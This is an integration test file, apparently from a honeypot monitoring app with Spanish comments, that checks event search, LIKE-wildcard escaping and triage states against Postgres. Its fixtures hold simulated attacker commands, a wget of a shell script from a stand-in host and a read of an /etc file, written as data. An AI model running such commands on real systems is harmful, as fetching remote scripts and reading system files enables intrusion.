/*
 * El triaje de eventos y la búsqueda libre, contra Postgres de verdad (lo que
 * el filtrado por estado y el ILIKE sobre la línea firmada no se pueden probar
 * mockeando la base). Se salta sin DATABASE_URL, como los demás *-base.
 */
import { readFileSync } from 'node:fs';
import { afterAll, beforeAll, describe, expect, it, vi } from 'vitest';

let hayBase = false;
try {
	for (const l of readFileSync('.env', 'utf8').split('\n')) {
		const m = l.match(/^([A-Z_]+)=(.*)$/);
		if (m && !process.env[m[1]]) process.env[m[1]] = m[2].replace(/^"|"$/g, '');
	}
	hayBase = !!process.env.DATABASE_URL;
} catch {
	hayBase = false;
}
vi.mock('$env/dynamic/private', () => ({ env: process.env }));
vi.mock('$app/environment', () => ({ building: false, dev: true }));

const { db, schema: s } = hayBase ? await import('./db') : ({} as never);
const { eventos, fijarTriaje, quitarTriaje, resumen, visita } = hayBase
	? await import('./consultas')
	: ({} as never);
const { eq } = await import('drizzle-orm');

const SENSOR = 'zz-triaje';
/* Una cadena única, para que la búsqueda solo case con los eventos de esta prueba. */
const MARCA = 'zzbuscametriaje';
const ID = (n: number) => `bbbbbbbb-0000-4000-8000-${String(n).padStart(12, '0')}`;

function evento(n: number, input: string) {
	const id = ID(n);
	const cuando = new Date(Date.UTC(2026, 9, 2, 0, n));
	return {
		id,
		sensor: SENSOR,
		linea: JSON.stringify({
			id,
			cuando: cuando.toISOString(),
			origen: { ip: '203.0.113.50' },
			trampa: { id: 'zz-triaje-t1', modulo: 'cowrie', tipo: 'contenedor' },
			accion: 'comando',
			severidad: 'alta',
			/* session: para que visita() (cowrie: sesion=session) tome la rama de la
			 * subconsulta con COLUMNAS, justo la que rompía la regresión. */
			detalle: { input, session: 'zz-sess-1' }
		}),
		hash: `${SENSOR}-${n}`,
		cuando,
		trampa: 'zz-triaje-t1',
		modulo: 'cowrie',
		tipo: 'contenedor',
		accion: 'comando',
		severidad: 'alta' as const,
		conexionEstablecida: true
	};
}

async function limpiar() {
	if (!hayBase) return;
	/* El triaje se va solo con el evento (ON DELETE CASCADE), pero por si acaso. */
	for (const n of [1, 2, 3]) await db.delete(s.triaje).where(eq(s.triaje.evento, ID(n)));
	await db.delete(s.eventos).where(eq(s.eventos.sensor, SENSOR));
	await db.delete(s.sensores).where(eq(s.sensores.id, SENSOR));
	await db.delete(s.auditoria).where(eq(s.auditoria.quien, 'zz-operador'));
}

describe.skipIf(!hayBase)('triaje y búsqueda de eventos', () => {
	beforeAll(async () => {
		await limpiar();
		await db.insert(s.sensores).values({ id: SENSOR, nombre: SENSOR, claveHash: `x-${SENSOR}` });
		await db
			.insert(s.eventos)
			.values([
				evento(1, `wget http://malo.invalid/${MARCA}.sh`),
				evento(2, `cat /etc/${MARCA}`),
				evento(3, 'ls -la')
			]);
	});
	afterAll(async () => {
		if (hayBase && !process.env.CONSERVAR) await limpiar();
	});

	it('la búsqueda libre casa dentro de la línea firmada (comando)', async () => {
		const r = await eventos({ q: MARCA });
		expect(r.map((e) => e.id).sort()).toEqual([ID(1), ID(2)].sort());
		/* Un término que no está no devuelve nada de esta prueba. */
		expect((await eventos({ q: `${MARCA}-no-existe` })).some((e) => e.sensor === SENSOR)).toBe(
			false
		);
	});

	it('la búsqueda escapa los comodines del LIKE (el % es literal)', async () => {
		/* Con el % sin escapar, «%.sh» casaría cualquier cosa; escapado, nada de esta prueba. */
		expect((await eventos({ q: `%${MARCA}` })).some((e) => e.sensor === SENSOR)).toBe(false);
	});

	it('fijar, filtrar y quitar el triaje', async () => {
		expect(await fijarTriaje('zz-operador', ID(1), 'falso-positivo', 'un escáner')).toBe(true);
		expect(await fijarTriaje('zz-operador', ID(2), 'interesante', null)).toBe(true);

		const uno = (await eventos({ q: MARCA })).find((e) => e.id === ID(1));
		expect(uno?.triaje).toEqual({ estado: 'falso-positivo', nota: 'un escáner' });

		/* Filtrar por estado (acotado con la marca para no coger triajes de otras pruebas). */
		expect((await eventos({ q: MARCA, triaje: 'interesante' })).map((e) => e.id)).toEqual([ID(2)]);
		/* «sin»: los de esta prueba sin triar (el 3 no tiene marca, así que uso otro filtro). */
		expect((await eventos({ q: MARCA, triaje: 'sin' })).map((e) => e.id)).toEqual([]);

		/* Re-fijar cambia el estado (upsert por evento). */
		expect(await fijarTriaje('zz-operador', ID(1), 'revisado', null)).toBe(true);
		expect((await eventos({ q: MARCA, triaje: 'revisado' })).map((e) => e.id)).toEqual([ID(1)]);

		await quitarTriaje('zz-operador', ID(1));
		const sin = (await eventos({ q: MARCA })).find((e) => e.id === ID(1));
		expect(sin?.triaje).toBeNull();
	});

	it('fijar el triaje de un evento que no existe devuelve false', async () => {
		expect(await fijarTriaje('zz-operador', ID(9), 'revisado', null)).toBe(false);
	});

	/*
	 * Regresión (la cazó la revisión): resumen() y visita() comparten COLUMNAS y
	 * NO unen la tabla triaje, así que meter columnas de triaje en COLUMNAS las
	 * reventaba al construir la consulta. Con un evento de cowrie (tiene «sesion»)
	 * triado, las dos tienen que correr sin lanzar.
	 */
	it('resumen() y visita() siguen funcionando con un evento triado', async () => {
		await fijarTriaje('zz-operador', ID(1), 'interesante', null);
		await expect(resumen()).resolves.toBeTruthy();
		const v = await visita(ID(1));
		expect(v?.visita?.some((x: { id: string }) => x.id === ID(1))).toBe(true);
		await quitarTriaje('zz-operador', ID(1));
	});
});
